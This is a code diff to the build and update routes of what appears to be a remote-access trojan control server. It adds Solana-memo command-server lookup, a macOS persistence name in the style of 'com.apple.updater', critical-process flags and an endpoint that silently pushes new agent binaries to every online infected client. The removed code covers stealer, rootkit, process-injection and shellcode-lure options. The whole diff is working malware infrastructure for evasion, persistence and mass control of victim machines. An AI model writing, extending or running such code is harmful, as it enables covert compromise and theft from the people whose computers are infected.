@@ -1,14 +1,19 @@
+import { createHash } from "crypto";
 import { v4 as uuidv4 } from "uuid";
 import { authenticateRequest } from "../../auth";
 import { AuditAction, logAudit } from "../../auditLog";
 import * as buildManager from "../../build/buildManager";
+import * as clientManager from "../../clientManager";
 import { deleteBuild, getAllBuilds, getBuild } from "../../db";
+import { encodeMessage } from "../../protocol";
+import { metrics } from "../../metrics";
 import { requirePermission } from "../../rbac";
 import { logger } from "../../logger";
+import { normalizeClientOs } from "../deploy-utils";
 import path from "path";
 import fs from "fs";
 import { resolveRuntimeRoot } from "../runtime-paths";
-import { resolveDataDir } from "../../paths";
+import { createUploadPull } from "./file-download-routes";
 
 type RequestIpProvider = {
   requestIP: (req: Request) => { address?: string } | null | undefined;
@@ -44,6 +49,9 @@ export async function handleBuildRoutes(
         platforms,
         serverUrl,
         rawServerList,
+        solMemo,
+        solAddress,
+        solRpcEndpoints,
         stripDebug,
         disableCgo,
         obfuscate,
@@ -66,25 +74,10 @@ export async function handleBuildRoutes(
         iconBase64,
         enableUpx,
         upxStripHeaders,
-        enableDonut,
-        enableTyphon,
-        typhonVariant,
-        enableVault,
-        vaultRecipient,
-        enableStealer,
-        enableJar,
-        jarMcVersion,
-        jarModName,
-        jarModId,
-        jarBoundMods,
-        enableR77,
-        enableChaos,
-        chaosMode,
-        typhonProcess,
         requireAdmin,
+        criticalProcess,
         outputExtension,
         sleepSeconds,
-        jitterPercent,
         boundFiles,
       } = body;
 
@@ -111,10 +104,19 @@ export async function handleBuildRoutes(
       }
 
       const safeRawServerList = !!rawServerList;
+      const safeSolMemo = !!solMemo;
       const safeServerUrl =
         typeof serverUrl === "string" && serverUrl.trim() !== ""
           ? serverUrl.trim()
           : undefined;
+
+      if (safeRawServerList && safeSolMemo) {
+        return Response.json(
+          { error: "Cannot enable both raw server list and Solana memo mode" },
+          { status: 400 },
+        );
+      }
+
       if (safeRawServerList) {
         if (!safeServerUrl) {
           return Response.json(
@@ -132,6 +134,46 @@ export async function handleBuildRoutes(
           }
         } catch {
           return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
+        }
+      }
+
+      let safeSolAddress: string | undefined;
+      let safeSolRpcEndpoints: string | undefined;
+      if (safeSolMemo) {
+        if (typeof solAddress !== "string" || !solAddress.trim()) {
+          return Response.json(
+            { error: "Solana memo mode requires a Solana address" },
+            { status: 400 },
+          );
+        }
+        const trimmedAddr = solAddress.trim();
+        if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmedAddr)) {
+          return Response.json(
+            { error: "Invalid Solana address (must be Base58, 32-44 chars)" },
+            { status: 400 },
+          );
+        }
+        safeSolAddress = trimmedAddr;
+
+        if (typeof solRpcEndpoints === "string" && solRpcEndpoints.trim()) {
+          const endpoints = solRpcEndpoints.split("\n").map((e: string) => e.trim()).filter(Boolean);
+          for (const ep of endpoints) {
+            try {
+              const parsed = new URL(ep);
+              if (parsed.protocol !== "https:" && parsed.protocol !== "http:") {
+                return Response.json(
+                  { error: `Invalid RPC endpoint protocol: ${ep}` },
+                  { status: 400 },
+                );
+              }
+            } catch {
+              return Response.json(
+                { error: `Invalid RPC endpoint URL: ${ep}` },
+                { status: 400 },
+              );
+            }
+          }
+          safeSolRpcEndpoints = endpoints.join(",");
         }
       }
 
@@ -157,9 +199,16 @@ export async function handleBuildRoutes(
           : ['startup'];
       if (safePersistenceMethods.length === 0) safePersistenceMethods.push('startup');
       const safeStartupName =
-        typeof startupName === 'string' && /^[A-Za-z0-9_-]{1,32}$/.test(startupName.trim())
+        typeof startupName === 'string' && /^[A-Za-z0-9_.-]{1,64}$/.test(startupName.trim())
           ? startupName.trim()
           : undefined;
+      const hasDarwinTarget = allowedPlatforms.some((p) => p.startsWith('darwin-'));
+      if (hasDarwinTarget && safeStartupName && !safeStartupName.startsWith('com.')) {
+        return Response.json(
+          { error: 'Startup name for macOS must start with "com." (e.g. com.apple.updater)' },
+          { status: 400 },
+        );
+      }
       const safeOutputName = typeof outputName === "string" && /^[A-Za-z0-9._-]{1,64}$/.test(outputName.trim())
         ? outputName.trim()
         : undefined;
@@ -175,37 +224,17 @@ export async function handleBuildRoutes(
         ? iconBase64
         : undefined;
       const safeRequireAdmin = !!requireAdmin;
-      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com", ".jar", ".bin"]);
+      const safeCriticalProcess = !!criticalProcess;
+      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
       const safeOutputExtension =
         typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
           ? outputExtension.toLowerCase() : ".exe";
-      // .bin means Donut shellcode output — auto-enable Donut; JAR builds also need Donut
-      const effectiveEnableDonut = !!enableDonut || safeOutputExtension === ".bin" || !!enableJar || safeOutputExtension === ".jar";
       const safeSleepSeconds =
         typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
           ? sleepSeconds : 0;
-      const safeJitterPercent =
-        typeof jitterPercent === "number" && Number.isInteger(jitterPercent) && jitterPercent >= 0 && jitterPercent <= 50
-          ? jitterPercent : 20;
-      const VALID_TYPHON_VARIANTS = new Set(["1", "2", "3", "4", "5", "6", "7", "8", "all", "safe", "rec"]);
-      const safeTyphonVariant =
-        typeof typhonVariant === "string" && VALID_TYPHON_VARIANTS.has(typhonVariant.trim().toLowerCase())
-          ? typhonVariant.trim().toLowerCase()
-          : "1";
-      const VALID_TYPHON_PROCESSES = new Set([
-        "notepad.exe", "conhost.exe", "explorer.exe", "svchost.exe",
-        "dllhost.exe", "cmd.exe", "powershell.exe", "msiexec.exe",
-        "werfault.exe", "runtimebroker.exe", "searchhost.exe",
-      ]);
-      const safeTyphonProcess = typeof typhonProcess === "string"
-        && VALID_TYPHON_PROCESSES.has(typhonProcess.toLowerCase().trim())
-        ? typhonProcess.toLowerCase().trim() : undefined;
-      const safeChaosMode = typeof chaosMode === "string"
-        && (["both", "ring0", "ring3"] as const).includes(chaosMode.toLowerCase() as any)
-        ? (chaosMode.toLowerCase() as "both" | "ring0" | "ring3") : "both";
 
       const MAX_BOUND_FILES = 5;
-      const MAX_BOUND_FILE_BYTES = 10 * 1024 * 1024;
+      const MAX_BOUND_FILE_BYTES = 50 * 1024 * 1024;
       const ALLOWED_BIND_TARGET_OS = new Set(["windows", "linux", "darwin"]);
       const RESERVED_BIND_NAMES = new Set(["manifest.json"]);
       type SafeBoundFile = { name: string; data: string; targetOS: string[]; execute: boolean };
@@ -237,7 +266,7 @@ export async function handleBuildRoutes(
           }
           const approxDecodedBytes = Math.floor(f.data.length * 3 / 4);
           if (approxDecodedBytes > MAX_BOUND_FILE_BYTES) {
-            return Response.json({ error: `Bound file '${safeName}' exceeds the 10 MB limit` }, { status: 400 });
+            return Response.json({ error: `Bound file '${safeName}' exceeds the 50 MB limit` }, { status: 400 });
           }
           const safeTargetOS = Array.isArray(f.targetOS)
             ? f.targetOS.filter((o: unknown) => typeof o === "string" && ALLOWED_BIND_TARGET_OS.has(o as string)) as string[]
@@ -252,21 +281,13 @@ export async function handleBuildRoutes(
         safeBoundFiles = validated;
       }
 
-      // Validate jarBoundMods — only .jar files, max 3, base64 data
-      let safeJarBoundMods: { name: string; data: string }[] | undefined;
-      if (Array.isArray(jarBoundMods) && jarBoundMods.length > 0) {
-        safeJarBoundMods = jarBoundMods.slice(0, 3).flatMap((m: any) => {
-          if (!m || typeof m.name !== "string" || typeof m.data !== "string") return [];
-          const safeName = m.name.replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 64);
-          if (!safeName.toLowerCase().endsWith(".jar")) return [];
-          return [{ name: safeName, data: m.data }];
-        });
-      }
-
       deps.startBuildProcess(buildId, {
         platforms: allowedPlatforms,
         serverUrl: safeServerUrl,
         rawServerList: safeRawServerList,
+        solMemo: safeSolMemo,
+        solAddress: safeSolAddress,
+        solRpcEndpoints: safeSolRpcEndpoints,
         mutex: safeMutex,
         disableMutex: safeDisableMutex,
         stripDebug,
@@ -290,34 +311,11 @@ export async function handleBuildRoutes(
         iconBase64: safeIconBase64,
         enableUpx: !!enableUpx,
         upxStripHeaders: !!upxStripHeaders,
-        enableDonut: effectiveEnableDonut,
-        enableTyphon: !!enableTyphon,
-        typhonVariant: !!enableTyphon ? safeTyphonVariant : undefined,
-        enableVault: !!enableVault,
-        vaultRecipient: !!enableVault && typeof vaultRecipient === "string" && vaultRecipient.trim().length > 0
-          ? vaultRecipient.trim().slice(0, 512)
-          : undefined,
-        enableStealer: !!enableStealer,
-        enableJar: !!enableJar,
-        jarMcVersion: typeof jarMcVersion === "string" && /^\d+\.\d+(\.\d+)?$/.test(jarMcVersion.trim())
-          ? jarMcVersion.trim()
-          : "1.21.4",
-        jarModName: typeof jarModName === "string" && jarModName.trim().length > 0
-          ? jarModName.trim().slice(0, 64)
-          : undefined,
-        jarModId: typeof jarModId === "string" && /^[a-z0-9_]{1,32}$/.test(jarModId.trim())
-          ? jarModId.trim()
-          : undefined,
-        enableR77: !!enableR77,
-        enableChaos: !!enableChaos,
-        chaosMode: !!enableChaos ? safeChaosMode : undefined,
-        typhonProcess: !!enableTyphon ? safeTyphonProcess : undefined,
         requireAdmin: safeRequireAdmin,
+        criticalProcess: safeCriticalProcess,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
-        jitterPercent: safeJitterPercent,
         boundFiles: safeBoundFiles,
-        jarBoundMods: safeJarBoundMods,
       });
 
       return Response.json({ buildId });
@@ -511,121 +509,229 @@ export async function handleBuildRoutes(
       });
     }
 
-    // ── Shellcode endpoint — serve donut-converted shellcode for a built PE ─────
-    // GET /api/build/shellcode/<filename>
-    // Runs the PE from dist-clients/ through donut and returns raw .bin bytes.
-    // Used by the tasks.json lure stager for in-process shellcode injection.
-
-    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/shellcode\//)) {
+    if (req.method === "POST" && url.pathname === "/api/build/update-eligible") {
       requirePermission(user, "clients:build");
 
-      const rawName = url.pathname.split("/api/build/shellcode/")[1] || "";
-      let fileName = rawName;
+      let body: any = {};
       try {
-        fileName = decodeURIComponent(rawName);
+        body = await req.json();
       } catch {
-        return Response.json({ error: "Bad request" }, { status: 400 });
+        return new Response("Bad request", { status: 400 });
       }
 
-      if (
-        !fileName ||
-        fileName.includes("\u0000") ||
-        fileName.includes("/") ||
-        fileName.includes("\\")
-      ) {
-        return Response.json({ error: "File not found" }, { status: 404 });
+      // Accept either a buildId (check existing build files) or platforms array (pre-build check)
+      const buildId = typeof body?.buildId === "string" ? body.buildId : "";
+      const platforms: string[] = Array.isArray(body?.platforms) ? body.platforms.filter((p: any) => typeof p === "string") : [];
+
+      let targetPlatforms: Set<string>;
+
+      if (buildId) {
+        const build = buildManager.getBuildStream(buildId);
+        const dbBuild = !build ? getBuild(buildId) : null;
+        const files = build?.files ?? dbBuild?.files;
+        if (!files || files.length === 0) {
+          return Response.json({ error: "Build not found or has no files" }, { status: 404 });
+        }
+
+        const rootDir = resolveRuntimeRoot();
+        const distRoot = path.resolve(rootDir, "dist-clients");
+
+        targetPlatforms = new Set<string>();
+        for (const f of files as any[]) {
+          const platform = (f as any).platform as string | undefined;
+          const filename = f.filename || f.name;
+          if (!platform || !filename) continue;
+          const filePath = path.resolve(distRoot, filename);
+          if (fs.existsSync(filePath)) {
+            targetPlatforms.add(platform);
+          }
+        }
+      } else if (platforms.length > 0) {
+        targetPlatforms = new Set(platforms);
+      } else {
+        return Response.json({ error: "Missing buildId or platforms" }, { status: 400 });
+      }
+
+      if (targetPlatforms.size === 0) {
+        return Response.json({ error: "No matching platforms found" }, { status: 404 });
+      }
+
+      const onlineClients = clientManager.getOnlineClients();
+      let eligible = 0;
+      let skippedInMemory = 0;
+      let skippedNoMatch = 0;
+
+      for (const client of onlineClients) {
+        if (client.inMemory) {
+          skippedInMemory++;
+          continue;
+        }
+        const clientOs = client.os?.toLowerCase() || "";
+        const clientArch = client.arch?.toLowerCase() || "";
+        const clientPlatform = `${clientOs}-${clientArch}`;
+        if (!targetPlatforms.has(clientPlatform)) {
+          skippedNoMatch++;
+          continue;
+        }
+        eligible++;
+      }
+
+      return Response.json({
+        eligible,
+        skippedInMemory,
+        skippedNoMatch,
+        totalOnline: onlineClients.length,
+      });
+    }
+
+    if (req.method === "POST" && url.pathname === "/api/build/update-all") {
+      requirePermission(user, "clients:build");
+      if (user.role !== "admin") {
+        return new Response("Forbidden: Admin access required", { status: 403 });
+      }
+
+      let body: any = {};
+      try {
+        body = await req.json();
+      } catch {
+        return new Response("Bad request", { status: 400 });
+      }
+
+      const buildId = typeof body?.buildId === "string" ? body.buildId : "";
+      if (!buildId) {
+        return Response.json({ error: "Missing buildId" }, { status: 400 });
+      }
+
+      const build = buildManager.getBuildStream(buildId);
+      const dbBuild = !build ? getBuild(buildId) : null;
+      const files = build?.files ?? dbBuild?.files;
+      if (!files || files.length === 0) {
+        return Response.json({ error: "Build not found or has no files" }, { status: 404 });
       }
 
       const rootDir = resolveRuntimeRoot();
       const distRoot = path.resolve(rootDir, "dist-clients");
-      const filePath = path.resolve(distRoot, fileName);
-      const rootWithSep = distRoot.endsWith(path.sep) ? distRoot : `${distRoot}${path.sep}`;
 
-      if (!filePath.startsWith(rootWithSep)) {
-        return Response.json({ error: "File not found" }, { status: 404 });
+      const hideWindow = body?.hideWindow === true;
+
+      const buildPlatforms = new Map<string, { filename: string; filePath: string; size: number }>();
+      for (const f of files as any[]) {
+        const platform = (f as any).platform as string | undefined;
+        const filename = f.filename || f.name;
+        if (!platform || !filename) continue;
+        const filePath = path.resolve(distRoot, filename);
+        const rootWithSep = distRoot.endsWith(path.sep) ? distRoot : `${distRoot}${path.sep}`;
+        if (!filePath.startsWith(rootWithSep)) continue;
+        if (!fs.existsSync(filePath)) continue;
+        const stat = fs.statSync(filePath);
+        buildPlatforms.set(platform, { filename, filePath, size: stat.size });
       }
 
-      const peFile = Bun.file(filePath);
-      if (!(await peFile.exists())) {
-        return Response.json({ error: "File not found" }, { status: 404 });
+      if (buildPlatforms.size === 0) {
+        return Response.json({ error: "No build files found on disk" }, { status: 404 });
       }
 
-      // Locate donut binary
-      const toolsDir = path.join(resolveDataDir(), "tools");
-      const donutBin = (() => {
-        const local = path.join(toolsDir, process.platform === "win32" ? "donut.exe" : "donut");
-        if (fs.existsSync(local)) return local;
+      // Pre-compute hashes per platform (avoid re-reading per client)
+      const platformHashes = new Map<string, string>();
+      for (const [platform, buildFile] of buildPlatforms) {
+        const fileBytes = new Uint8Array(fs.readFileSync(buildFile.filePath));
+        platformHashes.set(platform, createHash("sha256").update(fileBytes).digest("hex"));
+      }
+
+      const onlineClients = clientManager.getOnlineClients();
+      const results: Array<{ clientId: string; ok: boolean; reason?: string }> = [];
+
+      for (const client of onlineClients) {
+        if (client.inMemory) {
+          results.push({ clientId: client.id, ok: false, reason: "in_memory" });
+          continue;
+        }
+        if (!client.ws) {
+          results.push({ clientId: client.id, ok: false, reason: "no_ws" });
+          continue;
+        }
+
+        const clientOs = client.os?.toLowerCase() || "";
+        const clientArch = client.arch?.toLowerCase() || "";
+        const clientPlatform = `${clientOs}-${clientArch}`;
+        const buildFile = buildPlatforms.get(clientPlatform);
+        if (!buildFile) {
+          results.push({ clientId: client.id, ok: false, reason: "no_matching_build" });
+          continue;
+        }
+
         try {
-          const r = Bun.spawnSync(["which", "donut"]);
-          if (r.exitCode === 0) return r.stdout.toString().trim();
-        } catch {}
-        return null;
-      })();
+          const fileHash = platformHashes.get(clientPlatform)!;
+          const clientNormOs = normalizeClientOs(client.os);
+          const destDir = clientNormOs === "windows"
+            ? `C:\\Windows\\Temp\\Overlord\\update-${buildId.substring(0, 8)}`
+            : `/tmp/overlord/update-${buildId.substring(0, 8)}`;
+          const destPath = clientNormOs === "windows"
+            ? `${destDir}\\${buildFile.filename}`
+            : `${destDir}/${buildFile.filename}`;
 
-      if (!donutBin) {
-        return Response.json({ error: "Donut not available on this server" }, { status: 503 });
-      }
+          const pullId = createUploadPull({
+            clientId: client.id,
+            filePath: buildFile.filePath,
+            fileName: buildFile.filename,
+            size: buildFile.size,
+          });
+          const pullUrl = `${url.origin}/api/file/upload/pull/${encodeURIComponent(pullId)}`;
 
-      // Run donut: -i <pe> -o <bin> -a 2 (x64) -f 1 (raw shellcode)
-      const tmpBin = path.join(toolsDir, `sc_${uuidv4()}.bin`);
-      try {
-        const proc = Bun.spawnSync([donutBin, "-i", filePath, "-o", tmpBin, "-a", "2", "-f", "1"]);
-        if (proc.exitCode !== 0) {
-          const err = proc.stderr?.toString().trim() || proc.stdout?.toString().trim() || "unknown";
-          logger.warn(`[shellcode] donut failed: ${err}`);
-          return Response.json({ error: "Shellcode generation failed" }, { status: 500 });
+          client.ws.send(
+            encodeMessage({
+              type: "command",
+              commandType: "file_upload_http",
+              id: uuidv4(),
+              payload: { path: destPath, url: pullUrl, total: buildFile.size },
+            }),
+          );
+
+          if (clientNormOs !== "windows") {
+            client.ws.send(
+              encodeMessage({
+                type: "command",
+                commandType: "file_chmod",
+                id: uuidv4(),
+                payload: { path: destPath, mode: "0755" },
+              }),
+            );
+          }
+
+          client.ws.send(
+            encodeMessage({
+              type: "command",
+              commandType: "agent_update",
+              id: uuidv4(),
+              payload: { path: destPath, hash: fileHash, hideWindow },
+            }),
+          );
+
+          metrics.recordCommand("agent_update");
+          results.push({ clientId: client.id, ok: true });
+        } catch (err: any) {
+          results.push({ clientId: client.id, ok: false, reason: err?.message || "unknown_error" });
         }
-
-        const scFile = Bun.file(tmpBin);
-        if (!(await scFile.exists())) {
-          return Response.json({ error: "Shellcode output missing" }, { status: 500 });
-        }
-
-        const scBytes = await scFile.arrayBuffer();
-        const scName = fileName.replace(/\.[^.]+$/, "") + ".bin";
-        return new Response(scBytes, {
-          headers: {
-            "Content-Type": "application/octet-stream",
-            "Content-Disposition": `attachment; filename="${scName}"`,
-          },
-        });
-      } finally {
-        try { fs.unlinkSync(tmpBin); } catch {}
       }
-    }
 
-    // ── Vault keypair management ─────────────────────────────────────────────
-
-    if (req.method === "GET" && url.pathname === "/api/build/vault/status") {
-      requirePermission(user, "clients:build");
-      const toolsDir = path.join(resolveDataDir(), "tools");
-      const keyPath = path.join(toolsDir, "vault-operator-key");
-      const pubKeyPath = keyPath + ".pub";
-      const hasPrivateKey = fs.existsSync(keyPath);
-      const hasPublicKey = fs.existsSync(pubKeyPath);
-      let publicKey: string | null = null;
-      if (hasPublicKey) {
-        try { publicKey = fs.readFileSync(pubKeyPath, "utf-8").trim(); } catch {}
-      }
-      return Response.json({ hasKeypair: hasPrivateKey && hasPublicKey, hasPrivateKey, hasPublicKey, publicKey });
-    }
-
-    if (req.method === "GET" && url.pathname === "/api/build/vault/private-key") {
-      if (user.role !== "admin") {
-        return new Response("Forbidden: Admin only", { status: 403 });
-      }
-      const keyPath = path.join(resolveDataDir(), "tools", "vault-operator-key");
-      if (!fs.existsSync(keyPath)) {
-        return new Response("Not Found: No vault keypair generated yet. Run a vault-enabled build first.", { status: 404 });
-      }
-      const keyData = fs.readFileSync(keyPath);
+      const successCount = results.filter((r) => r.ok).length;
       const ip = server.requestIP(req)?.address || "unknown";
-      logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, details: "Downloaded vault private key", success: true });
-      return new Response(keyData, {
-        headers: {
-          "Content-Type": "application/octet-stream",
-          "Content-Disposition": 'attachment; filename="vault-operator-key"',
-        },
+      logAudit({
+        timestamp: Date.now(),
+        username: user.username,
+        ip,
+        action: AuditAction.AGENT_UPDATE,
+        success: true,
+        details: `update-all: ${successCount}/${onlineClients.length} clients updated from build ${buildId.substring(0, 8)}`,
+      });
+
+      logger.info(`[build:update-all] ${user.username} updated ${successCount}/${onlineClients.length} clients from build ${buildId.substring(0, 8)}`);
+
+      return Response.json({
+        ok: true,
+        totalOnline: onlineClients.length,
+        successCount,
+        results,
       });
     }
 
